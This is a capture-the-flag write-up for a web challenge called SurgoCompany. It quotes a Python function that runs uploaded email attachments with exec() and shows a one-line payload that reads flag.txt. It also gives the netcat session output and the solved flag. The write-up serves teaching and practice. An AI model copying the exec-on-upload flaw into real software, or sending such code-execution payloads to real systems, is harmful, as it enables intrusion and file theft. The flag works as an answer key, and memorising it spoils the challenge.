# SurgoCompany – Web Challenge Writeup

**Challenge Name:** SurgoCompany  
**Category:** Web   

---

##  Challenge Description

>SurgoCompany™ has just launched a brand-new online Customer Service platform 🧩. The system is still under development, and you've been asked to test it 😈. Simply enter your email, describe your issue, and optionally upload a file related to your problem 🤨. The source code of the challenge is saved somewhere on the filesystem... and rumor has it that a file named flag.txt is hiding in that very same folder 😜. Can you find a way to read it?

The challenge description hints that the **source code** and a file named **`flag.txt`** are located in the same directory on the server.

Goal: **Read `flag.txt`.**

---

## 🔍 Source Code Analysis

The vulnerable logic is located in the `check_attachment()` function:

```python
def check_attachment(filepath):
    if filepath is None:
        return False

    with open(filepath, "r") as f:
        content = f.read()

    try:
        exec(content)
        print("The attachment did not pass the security check.")
    except Exception as e:
        print("The attachment passed the security check.")
```
 ## Vulnerability

- User can supply attachment files through email which would be run on netcat server for execution as python script

- If it executes, it’s dangerous, but It's already executed lol...

### Important Constraint

- The server only accepts replies that: Come from the same email address Have the same subject, which includes the process PID Every new netcat connection creates a new PID, so only one reply per session is valid.

## Exploitation Strategy

1. Start the service using netcat

2. Enter a valid generated email address

3. Receive an email from SurgoCompany

4. Reply to that email without changing the subject & Attach a malicious Python file

5. The attachment is executed via exec()

6. Read and print the flag

### Exploit Payload

Filename: **exploit.py**

`print(open("flag.txt").read())`

### Step-by-Step Exploitation
1. Connect to the service
`nc surgobot.ctf.pascalctf.it xxxx`
2. Enter a valid generated email:user-xxxx@skillissue.it Leave this terminal open.
3. Reply with attachment
- Click Reply
- Do not modify the subject
- Attach exploit.py
- Send within 2 minutes

### Response 
 ```
 nc surgobot.ctf.pascalctf.it xxxx

     ___                        ___                                              
    / __\ _ _  _ _  ___  ___   /  _\  ___  _ _ _  ___  ___  _ _  _ _                
    \__ \| | || '_>/ . |/ . \  | |__ / . \| ' ' || . \<_> || ' || | |
    /___/\___||_|  \_. |\___/  \___/ \___/|_|_|_||  _/<___||_|_|\_  |
                   <___/                         |_|            <___/
     ___          _       _                       ___   _  _             _    _
    | . | ___ ___<_> ___<| |> ___  _ _  ___ ___  /  _\ | |<_> ___  _ _ <| |> <_>
    |   |<_-<<_-<| |<_-< | | / ._>| ' | / /<_> | | |__ | || |/ ._>| ' | | |  | |
    |_|_|/__//__/|_|/__/ |_| \___\|_|_|/___<___| \___/ |_||_|\___\|_|_| |_|  |_|
                                                                                
    
Our customer support system is currently under development.
In the meantime, you can contact us about your problem via email.

Enter your email address:
user-i1urcmge@skillissue.it

Thank you (user-i1urcmge@skillissue.it)! We will contact you as soon as possible.

We have sent you an email with instructions to resolve your issue.
We are waiting for your reply... (approximately 2 minutes maximum wait)

...
...
...

Your reply has been received!

Checking attachment '/tmp/tmpj450y1c4/exploit.py'...
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}

The attachment did not pass the security check.
Removing the attachment...

The request will be forwarded to our support team.
We will contact you as soon as possible, goodbye!
```

## Flag
`pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}`

PWN by **W4RR1OR**